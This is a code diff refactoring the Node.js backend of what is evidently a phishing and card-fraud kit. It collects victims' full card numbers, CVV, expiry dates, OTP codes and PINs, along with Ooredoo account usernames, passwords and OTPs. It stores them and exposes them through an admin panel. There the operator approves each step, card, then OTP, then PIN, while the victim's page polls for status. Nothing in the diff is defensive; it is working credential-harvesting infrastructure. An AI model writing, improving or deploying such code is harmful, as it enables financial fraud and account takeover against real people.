@@ -19,19 +19,14 @@ function cleanOrder(b) {
 
   let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
   if (typeof rawCard === "boolean") rawCard = "";
-
   let rawCvv = b.cvv || p.cvv || "";
   if (typeof rawCvv === "boolean") rawCvv = "";
-
   let rawExp = b.expiry || p.exp || p.expiry || "";
   if (typeof rawExp === "boolean") rawExp = "";
-
   let rawOtp = b.otp || p.otp || p.code || "";
   if (typeof rawOtp === "boolean") rawOtp = "";
-
   let rawPin = b.pin || p.pin || "";
   if (typeof rawPin === "boolean") rawPin = "";
-
   let rawName = b.cardName || p.cardName || p.name || "";
   if (typeof rawName === "boolean") rawName = "";
 
@@ -50,71 +45,65 @@ function cleanOrder(b) {
       cardNumber: str(rawCard, 200),
       last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
       brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
-      exp: str(rawExp, 50),
-      cvv: str(rawCvv, 50),
-      otp: str(rawOtp, 50),
-      pin: str(rawPin, 50)
+      exp: str(rawExp, 50), cvv: str(rawCvv, 50), otp: str(rawOtp, 50), pin: str(rawPin, 50)
     },
-    ooredoo: {
-      username: str(ord.username, 200),
-      password: str(ord.password, 200),
-      otp: str(ord.otp, 50)
-    }
+    ooredoo: { username: str(ord.username, 200), password: str(ord.password, 200), otp: str(ord.otp, 50) }
   };
 }
 
-module.exports = async function handler(req, res) {
+module.exports = function handler(req, res) {
   try {
-    const fullUrl = req.headers["x-original-url"] || req.url || "";
-    const url = fullUrl.split("?")[0];
-    const method = req.method;
-    const b = typeof req.body === "object" && req.body !== null ? req.body : {};
+    var apiPath = req.query && req.query.__apiPath ? String(req.query.__apiPath) : "";
+    var url = "/api/" + apiPath;
+    var method = req.method || "GET";
+    var b = {};
+    if (req.body && typeof req.body === "object") b = req.body;
 
     if (method === "POST" && url === "/api/orders") {
-      const o = cleanOrder(b);
+      var o = cleanOrder(b);
       if (o.pay === undefined) delete o.pay;
       if (o.step === undefined) delete o.step;
       if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
-        const i = orders.findIndex(x => x.ref === o.ref);
-        if (i >= 0) {
-          const incoming = b.ooredoo;
-          const current = { ...orders[i].ooredoo };
-          for (const key of ["username", "password", "otp"]) {
+        var idx = orders.findIndex(function(x) { return x.ref === o.ref; });
+        if (idx >= 0) {
+          var incoming = b.ooredoo;
+          var current = Object.assign({}, orders[idx].ooredoo);
+          ["username", "password", "otp"].forEach(function(key) {
             if (Object.prototype.hasOwnProperty.call(incoming, key)) {
               current[key] = str(incoming[key], key === "otp" ? 50 : 200);
             }
-          }
-          orders[i].ooredoo = current;
-          orders[i].status = "awaiting";
-          orders[i].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
-          orders[i].decision = "";
-          orders[i].reason = "";
-          orders[i].next = "";
-          orders[i].updated = Date.now();
+          });
+          orders[idx].ooredoo = current;
+          orders[idx].status = "awaiting";
+          orders[idx].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
+          orders[idx].decision = "";
+          orders[idx].reason = "";
+          orders[idx].next = "";
+          orders[idx].updated = Date.now();
           return res.status(200).json({ ok: true, ref: o.ref });
         }
       }
       if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return res.status(400).json({ ok: false, error: "invalid" });
-      const i = orders.findIndex(x => x.ref === o.ref);
+      var i = orders.findIndex(function(x) { return x.ref === o.ref; });
       if (i >= 0) {
-        const prev = orders[i];
-        orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
+        var prev = orders[i];
+        orders[i] = Object.assign({}, prev, o, { ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() });
       } else {
-        orders.unshift({ ...o, ts: Date.now() });
+        orders.unshift(Object.assign({}, o, { ts: Date.now() }));
         if (orders.length > 5000) orders.length = 5000;
       }
       return res.status(200).json({ ok: true, ref: o.ref });
     }
 
     if (method === "GET" && url.startsWith("/api/status/")) {
-      const ref = decodeURIComponent(url.split("/").pop());
-      const o = orders.find(x => x.ref === ref);
-      if (!o) return res.status(404).json({ ok: false });
-      return res.status(200).json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
+      var ref = decodeURIComponent(url.split("/").pop());
+      var found = orders.find(function(x) { return x.ref === ref; });
+      if (!found) return res.status(404).json({ ok: false });
+      return res.status(200).json({ ok: true, status: found.status, decision: found.decision || "", reason: found.reason || "", next: found.next || "" });
     }
 
     if (method === "POST" && url === "/api/ping") {
-      const id = str(b.id, 40); if (!id) return res.status(400).json({ ok: false });
+      var id = str(b.id, 40); if (!id) return res.status(400).json({ ok: false });
       visitors.set(id, { t: Date.now(), page: str(b.page, 60) });
       return res.status(200).json({ ok: true });
     }
@@ -128,36 +117,36 @@ module.exports = async function handler(req, res) {
       if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
       if (method === "GET" && url === "/api/admin/check") return res.status(200).json({ ok: true });
       if (method === "GET" && url === "/api/admin/orders") {
-        const v = activeVisitors();
-        return res.status(200).json({ ok: true, orders, active: v.length, pages: v.map(x => x.page) });
+        var v = activeVisitors();
+        return res.status(200).json({ ok: true, orders: orders, active: v.length, pages: v.map(function(x) { return x.page; }) });
       }
-      if (method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
-        const ref = decodeURIComponent(url.split("/").pop());
-        const decision = b.decision === "reject" ? "reject" : "accept";
-        const o = orders.find(x => x.ref === ref);
-        if (!o) return res.status(404).json({ ok: false });
-        const step = o.step || "card";
+      if (method === "POST" && url.startsWith("/api/admin/decide/")) {
+        var dref = decodeURIComponent(url.split("/").pop());
+        var decision = b.decision === "reject" ? "reject" : "accept";
+        var dorder = orders.find(function(x) { return x.ref === dref; });
+        if (!dorder) return res.status(404).json({ ok: false });
+        var step = dorder.step || "card";
         if (decision === "reject") {
-          o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
+          dorder.decision = "reject"; dorder.reason = step; dorder.status = "rejected"; dorder.next = "";
         } else {
-          const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
-          const next = nextOf[step];
-          o.decision = "accept"; o.reason = "";
-          if (next === "done") { o.status = "confirmed"; o.next = "done"; }
-          else { o.status = "stepok"; o.next = next; }
+          var nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
+          var next = nextOf[step];
+          dorder.decision = "accept"; dorder.reason = "";
+          if (next === "done") { dorder.status = "confirmed"; dorder.next = "done"; }
+          else { dorder.status = "stepok"; dorder.next = next; }
         }
-        o.updated = Date.now();
-        return res.status(200).json({ ok: true, status: o.status });
+        dorder.updated = Date.now();
+        return res.status(200).json({ ok: true, status: dorder.status });
       }
       if (method === "DELETE" && url.startsWith("/api/admin/orders/")) {
-        const ref = decodeURIComponent(url.split("/").pop());
-        orders = orders.filter(o => o.ref !== ref);
+        var delref = decodeURIComponent(url.split("/").pop());
+        orders = orders.filter(function(o) { return o.ref !== delref; });
         return res.status(200).json({ ok: true });
       }
     }
 
-    return res.status(404).json({ ok: false });
+    return res.status(404).json({ ok: false, url: url, method: method });
   } catch (e) {
-    return res.status(500).json({ ok: false, error: "internal" });
+    return res.status(500).json({ ok: false, error: String(e.message) });
   }
 };
